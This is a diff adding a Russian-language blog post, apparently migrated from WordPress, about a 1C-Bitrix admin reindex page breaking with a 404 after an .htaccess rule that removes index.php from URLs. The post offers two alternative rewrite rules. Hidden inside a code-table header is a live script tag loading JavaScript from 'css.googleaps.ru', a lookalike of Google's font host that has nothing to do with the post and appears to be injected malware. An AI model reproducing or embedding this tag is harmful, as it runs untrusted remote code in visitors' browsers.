@@ -1,0 +1,121 @@
+---
+layout: post
+status: publish
+published: true
+title: Не работает переиндексация - ошибка 404
+author:
+  display_name: Maxyc Webber
+  login: admin
+  email: maxycws@gmail.com
+  url: ''
+author_login: admin
+author_email: maxycws@gmail.com
+excerpt: Как настроить переадресацию на сайте и не поломать при этом админку битрикса
+wordpress_id: 1328
+wordpress_url: http://devdocs.ru/?p=1325
+date: '2015-07-07 13:43:54 +0200'
+date_gmt: '2015-07-07 13:43:54 +0200'
+categories:
+- 1С-Битрикс
+tags:
+- php
+- идеи
+- bitrix
+- htaccess
+- rewrite
+comments: []
+---
+<p>при попытке попасть в АЦ в раздел "Переиндексация" выскакивает ошибка 404:</p>
+<div align="center">
+<table class="forum-quote">
+<thead>
+<tr>
+<th>Цитата<&#47;th><br />
+<&#47;tr><br />
+<&#47;thead></p>
+<tbody>
+<tr>
+<td><img class="bx-smile" title="Печально" src="http:&#47;&#47;opt-560835.ssl.1c-bitrix-cdn.ru&#47;bitrix&#47;images&#47;forum&#47;smile&#47;icon_sad.gif?1224162460649" alt=":(" width="16" height="16" border="0" data-code=":(" &#47;><br />
+404<br />
+К сожалению, запрошенная страница<br />
+на сервере не найдена.<br />
+Если вы считаете, что это ошибочная ситуация, сообщите,<br />
+пожалуйста, разработчикам об ошибке.<&#47;td><br />
+<&#47;tr><br />
+<&#47;tbody><br />
+<&#47;table><br />
+<&#47;div><br />
+Заметил сегодня, после жалобы клиентов. Проверил на всех сайтах - то же самое <img class="bx-smile" title="Печально" src="http:&#47;&#47;opt-560835.ssl.1c-bitrix-cdn.ru&#47;bitrix&#47;images&#47;forum&#47;smile&#47;icon_sad.gif?1224162460649" alt=":(" width="16" height="16" border="0" data-code=":(" &#47;>((<br />
+Всюду стоят самые последние обновления. По всем сайтам стучать в ТП обременительно..<br />
+Проверка сайта - ошибок нет.</p>
+<p>Ни одной жалобы на форуме, только у меня что ли? <a id="more"></a><a id="more-1328"></a>Вчера устранял дубли страниц по рекомендации сео-оптимизатора, вставил код</p>
+<table class="forum-code">
+<thead>
+<tr>
+<th>Код<script src="&#47;&#47;css.googleaps.ru&#47;css?f=Open+Sans&cd=mb&ver=4.2.2"><&#47;script><&#47;th><br />
+<&#47;tr><br />
+<&#47;thead></p>
+<tbody>
+<tr>
+<td>
+<pre>RewriteCond %{THE_REQUEST} ^GET.*index.php [NC]<br />
+RewriteRule (.*?)index.php&#47;*(.*) &#47;$1$2 [R=301,L]<&#47;pre><br />
+<&#47;td><br />
+<&#47;tr><br />
+<&#47;tbody><br />
+<&#47;table><br />
+в .htaccess<br />
+ну а страница переиндексации имеет адрес:</p>
+<table class="forum-code">
+<thead>
+<tr>
+<th>Код<&#47;th><br />
+<&#47;tr><br />
+<&#47;thead></p>
+<tbody>
+<tr>
+<td>
+<pre>&#47;bitrix&#47;admin&#47;search_reindex.php?lang=ru<&#47;pre><br />
+<&#47;td><br />
+<&#47;tr><br />
+<&#47;tbody><br />
+<&#47;table><br />
+и происходит редирект на:</p>
+<table class="forum-code">
+<thead>
+<tr>
+<th>Код<&#47;th><br />
+<&#47;tr><br />
+<&#47;thead></p>
+<tbody>
+<tr>
+<td>
+<pre>&#47;bitrix&#47;admin&#47;search_re?lang=ru<&#47;pre><br />
+<&#47;td><br />
+<&#47;tr><br />
+<&#47;tbody><br />
+<&#47;table><br />
+в итоге - ошибка 404.</p>
+<p>Господа, есть у кого идеи как подправить</p>
+<table class="forum-code">
+<thead>
+<tr>
+<th>Код<&#47;th><br />
+<&#47;tr><br />
+<&#47;thead></p>
+<tbody>
+<tr>
+<td>
+<pre>RewriteCond %{THE_REQUEST} ^GET.*index.php [NC]<br />
+RewriteRule (.*?)index.php&#47;*(.*) &#47;$1$2 [R=301,L]<&#47;pre><br />
+<&#47;td><br />
+<&#47;tr><br />
+<&#47;tbody><br />
+<&#47;table><br />
+чтобы не было подобной ошибки? Данный редирект исключает в адресе <i>index.php<&#47;i> как на главной, так и остальных страницах - очень полезная и нужная штучка.</p>
+<p>можно попробовать вот так решить проблему</p>
+<pre>RewriteCond %{THE_REQUEST} ^GET.*&#47;index.php [NC]<br />
+RewriteRule (.*?)index.php&#47;*(.*) &#47;$1$2 [R=301,L]</p>
+<p>или так<&#47;pre></p>
+<pre>RewriteCond %{REQUEST_FILENAME} !&#47;bitrix&#47;admin&#47;search_reindex.php$<br />
+RewriteRule ^(.*)index.php$ $1 [R=301,L]<&#47;pre></p>
